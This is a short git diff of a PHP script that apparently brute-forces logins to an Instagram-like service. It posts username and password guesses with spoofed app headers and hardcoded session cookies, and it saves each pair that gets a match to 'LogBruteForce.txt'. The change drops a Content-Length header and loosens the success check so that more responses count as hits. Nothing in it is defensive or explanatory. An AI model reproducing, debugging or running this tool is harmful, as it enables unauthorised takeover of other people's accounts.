@@ -47,15 +47,14 @@ function test($username,$password)
 		'X-ASBD-ID: 198387',
 		'X-IG-WWW-Claim: 0',
 		'Content-Type: application/x-www-form-urlencoded',
-		'Cookie: csrftoken=eZP8aOYZ9bZqFM8qMccdvGbN4AkLgMOE; mid=YYeMOAALAAFsbm4i_A3pOm0AN4uQ; ig_did=7E2E6768-90AB-40B9-B8A2-08CD1E5985BB; ig_nrcb=1',
-		'Content-Length: 178'
+		'Cookie: csrftoken=eZP8aOYZ9bZqFM8qMccdvGbN4AkLgMOE; mid=YYeMOAALAAFsbm4i_A3pOm0AN4uQ; ig_did=7E2E6768-90AB-40B9-B8A2-08CD1E5985BB; ig_nrcb=1'
 	];
 	curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
 	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 	$result = curl_exec($ch);
 	curl_close($ch);
 	$output = json_decode($result,true);
-	if (preg_match("/userId/", $result)) 
+	if (preg_match("/userId|message/", $result)) 
 	{
 		$file = fopen('LogBruteForce.txt', 'a+') or die ("gabisa di buka bosque !");
 		$isi  = $username." ".$password."\n";
